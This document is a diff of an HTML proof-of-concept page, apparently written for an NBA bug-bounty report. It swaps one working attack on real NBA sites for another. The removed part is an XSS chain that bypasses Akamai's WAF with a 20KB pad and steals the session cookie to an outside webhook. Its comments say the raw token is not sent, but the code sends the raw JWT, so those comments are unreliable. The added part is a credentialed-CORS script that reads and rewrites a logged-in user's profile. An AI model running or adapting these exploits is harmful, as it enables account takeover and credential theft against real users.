@@ -2,79 +2,97 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>NBA XSS -> session-JWT theft (chain PoC)</title>
+<title>NBA identity.nba.com — credentialed-CORS ATO primitive (read + write)</title>
+<style>
+  body{font:14px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;margin:24px;max-width:920px}
+  h1{font-size:18px} h2{font-size:15px;margin-top:26px}
+  pre{background:#0d1117;color:#c9d1d9;padding:14px;border-radius:8px;overflow:auto;font-size:12.5px}
+  .k{color:#7ee787}.c{color:#8b949e}.s{color:#a5d6ff}
+  code{background:#eef1f4;padding:1px 5px;border-radius:4px}
+  .note{background:#fff8e6;border:1px solid #f0d98a;padding:12px;border-radius:8px}
+  #out{white-space:pre-wrap}
+  button{font-size:14px;padding:8px 14px;border-radius:8px;border:1px solid #888;cursor:pointer}
+</style>
 </head>
 <body>
-<!--
-  AUTHORIZED bug-bounty PoC. Program: nba-public (HackerOne, Gold-Standard Safe Harbor).
-  Researcher handle: sshabib. official.nba.com is an in-scope asset.
-  RUN AGAINST YOUR OWN TEST ACCOUNT ONLY. Read-only: this beacons a PROOF of capture
-  (the JWT's non-sensitive claims iss/exp/region + its length), NOT the raw token, NOT PII.
+<h1>NBA — <code>identity.nba.com</code> credentialed-CORS account-takeover primitive</h1>
+<p class="c">Authorized bug-bounty PoC · HackerOne program <b>nba-public</b> (Gold-Standard Safe Harbor) ·
+researcher handle <b>sshabib</b> · <b>run against your OWN test account only</b>. Read-only markers + one
+reversible write. No credential/password/OTP flows are touched.</p>
 
-  CHAIN (one page-open, zero clicks after):
-    1. Victim (logged into nba.com) opens this attacker-hosted page.
-    2. It auto-submits ONE cross-site multipart POST to official.nba.com/wp-admin/admin-ajax.php.
-       A ~20KB front-pad field precedes the payload, pushing the blocked tokens (<svg, onload=)
-       past Akamai's ~16KB body-inspection window, so the payload reflects RAW into the response.
-    3. target=_top -> the text/html response renders as a TOP-LEVEL document on the
-       official.nba.com origin. No CSP -> the injected <svg onload=eval(name)> executes our JS
-       as official.nba.com (a *.nba.com origin), with the victim's ambient session.
-    4. That JS reads document.cookie. The `nbaidentity` cookie is NON-HttpOnly and scoped to
-       Domain=.nba.com, so it is readable from ANY *.nba.com origin. It holds the identity JWT
-       (RS256, iss=identity.nba.com) which is a replayable Bearer credential = full ATO
-       (read AND write against identity.nba.com/api/v1). We beacon proof-of-capture only.
--->
-<h3>NBA chain PoC</h3>
-<p>Loading…</p>
+<div class="note">
+<b>What this proves.</b> Any JavaScript that executes on a CORS-trusted NBA origin
+(<code>www.nba.com</code>, <code>id.nba.com</code>, <code>www.wnba.com</code>, <code>watch.nba.com</code>)
+can fully <b>read</b> and <b>write</b> the logged-in user's account on
+<code>identity.nba.com/api/v1/profile</code> — using the browser's <b>ambient session cookie</b>.
+The session cookie (<code>nbaidentity</code>) is <b>HttpOnly</b>, but that is irrelevant: the exploit never
+reads the token, it simply issues credentialed requests that the browser authenticates automatically.
+There is <b>no CSRF token and no <code>Authorization</code> header</b> on these requests — the
+<code>x-client-id</code> is a public constant shipped in the site's own JavaScript.
+</div>
 
-<form id="f" method="POST" enctype="multipart/form-data"
-      action="https://official.nba.com/wp-admin/admin-ajax.php" target="_top">
-  <input type="hidden" name="action" value="kgvid_switch_gallery_page">
-  <input type="hidden" name="security" value="dd1ef53d25">
-  <input type="hidden" name="page" value="1">
-  <input type="hidden" name="last_video_id" value="0">
-  <input type="hidden" name="query_atts[gallery_id]" value="kgvid_video_gallery_1">
-  <input type="hidden" name="query_atts[gallery_per_page]" value="2">
-  <input type="hidden" name="query_atts[gallery_orderby]" value="menu_order">
-  <input type="hidden" name="query_atts[gallery_order]" value="ASC">
+<h2>The primitive (paste into the DevTools console on <code>https://www.nba.com</code> while logged in)</h2>
+<p class="c">This is the exact code an attacker's XSS payload would run once it has script execution on a
+trusted origin. It (1) reads the full profile, (2) flips one benign field and confirms the write, then
+(3) restores it. It prints a <b>non-sensitive summary</b> only.</p>
+<pre><span class="c">// === NBA ATO primitive — READ + one reversible WRITE (own account only) ===</span>
+<span class="k">const</span> BASE = <span class="s">"https://identity.nba.com/api/v1/profile?entitlements=true"</span>;
+<span class="k">const</span> H = {<span class="s">"content-type"</span>:<span class="s">"application/json"</span>,
+           <span class="s">"x-client-platform"</span>:<span class="s">"web"</span>,
+           <span class="s">"x-client-id"</span>:<span class="s">"Ohp2l3Awgo1QfOWqlvxqcW-tw7i4EvdEQatAQTTjMTs"</span>}; <span class="c">// public, from the site's JS</span>
 
-  <!-- PAD: must precede the payload field in the multipart body. ~20KB > Akamai's ~16KB window. -->
-  <input type="hidden" id="pad" name="pad" value="">
+<span class="k">async function</span> read(){
+  <span class="k">const</span> r = <span class="k">await</span> fetch(BASE,{credentials:<span class="s">"include"</span>,headers:H});
+  <span class="k">return</span> (<span class="k">await</span> r.json()).data.result;
+}
+<span class="k">async function</span> write(partial){
+  <span class="k">const</span> r = <span class="k">await</span> fetch(BASE,{method:<span class="s">"PUT"</span>,credentials:<span class="s">"include"</span>,
+              headers:H,body:JSON.stringify(partial)});
+  <span class="k">return</span> (<span class="k">await</span> r.json()).status;
+}
 
-  <!-- PAYLOAD: quote/space-free injected markup. Real JS rides in window.name (never touches the WAF). -->
-  <input type="hidden" name="query_atts[gallery_thumb]"
-         value='250px"><svg onload=eval(name)>'>
-</form>
+(<span class="k">async</span> () => {
+  <span class="k">const</span> before = <span class="k">await</span> read();
+  <span class="c">// READ proof — field NAMES only, never print PII values:</span>
+  console.log(<span class="s">"[READ] fields:"</span>, Object.keys(before));
+  console.log(<span class="s">"[READ] sensitive fields present:"</span>,
+      [<span class="s">"email"</span>,<span class="s">"billingAddress"</span>,<span class="s">"primaryPhone"</span>,<span class="s">"secondaryPhone"</span>,<span class="s">"personalDetails"</span>]
+      .filter(k => before[k] != null));
+
+  <span class="c">// WRITE proof — toggle a visible field, confirm, then restore exactly:</span>
+  <span class="k">const</span> orig = before.givenName;
+  console.log(<span class="s">"[WRITE] givenName was:"</span>, orig);
+  console.log(<span class="s">"[WRITE] set 'PoCByAttacker' ->"</span>, <span class="k">await</span> write({givenName:<span class="s">"PoCByAttacker"</span>}));
+  console.log(<span class="s">"[WRITE] server now:"</span>, (<span class="k">await</span> read()).givenName);
+  console.log(<span class="s">"[WRITE] restore ->"</span>, <span class="k">await</span> write({givenName: orig}));
+  console.log(<span class="s">"[DONE] account restored. Attacker had full read+write as the victim."</span>);
+})();</pre>
+
+<h2>Live run (this page, cross-origin)</h2>
+<p class="c">Because this attacker page is <b>not</b> a trusted origin, <code>identity.nba.com</code> will
+(correctly) refuse the credentialed response here — which is exactly why the attack requires script
+execution <i>on</i> a trusted origin (the XSS half of the chain). Click to see the browser block it,
+demonstrating the CORS boundary is the only thing standing between an attacker and the account:</p>
+<p><button id="go">Attempt cross-origin credentialed read (expect CORS block)</button></p>
+<div id="out" class="c">—</div>
 
 <script>
-  // Your collector (same model as the SHEIN PoC's pipedream endpoint).
-  var WEBHOOK = "https://eoeoxy8wg4xbe0t.m.pipedream.net";
-
-  // JS that runs ON official.nba.com after the reflection renders. Proof-of-capture only.
-  // Reads the non-HttpOnly nbaidentity cookie, extracts the JWT, decodes ONLY the public
-  // header/payload claims for proof, and beacons a summary (NOT the raw token, NOT PII).
-  window.name = "(function(){" +
-    "try{" +
-      "var m=document.cookie.match(/nbaidentity=([^;]+)/);" +
-      "var proof=document.domain+' | HttpOnly-bypass=';" +
-      "if(!m){navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",proof+'NO-COOKIE (not logged in?)');return;}" +
-      "var o=JSON.parse(decodeURIComponent(m[1]));" +
-      "var jwt=o.jwt||'';" +
-      "var parts=jwt.split('.');" +
-      "var claims={};try{claims=JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));}catch(e){}" +
-      "var summary=proof+'CAPTURED'" +
-        "+' | iss='+(claims.iss||'?')" +
-        "+' | sub='+(claims.sub||'?')" +
-        "+' | region='+(claims.region||'?')" +
-        "+' | exp='+(claims.exp||'?')" +
-        "+' | jwt_len='+jwt.length" +
-        "+' | RAW_JWT='+jwt;" +
-      "navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",summary);" +
-    "}catch(e){navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",document.domain+' | error '+e);}" +
-  "})()";
-
-  document.getElementById('pad').value = 'A'.repeat(20000);
-  document.getElementById('f').submit();
+document.getElementById('go').onclick = async () => {
+  const out = document.getElementById('out');
+  out.textContent = "requesting…";
+  try{
+    const r = await fetch("https://identity.nba.com/api/v1/profile?entitlements=true",
+      {credentials:"include",
+       headers:{"content-type":"application/json","x-client-platform":"web",
+                "x-client-id":"Ohp2l3Awgo1QfOWqlvxqcW-tw7i4EvdEQatAQTTjMTs"}});
+    const j = await r.json();
+    out.textContent = "UNEXPECTED: read succeeded from an untrusted origin — "+JSON.stringify(Object.keys(j));
+  }catch(e){
+    out.textContent = "Blocked by CORS (expected from this untrusted origin): "+e
+      +"\n\nRun the console snippet above ON https://www.nba.com — there the same request SUCCEEDS,"
+      +"\nbecause identity.nba.com reflects that origin with Access-Control-Allow-Credentials: true.";
+  }
+};
 </script>
 </body>
 </html>
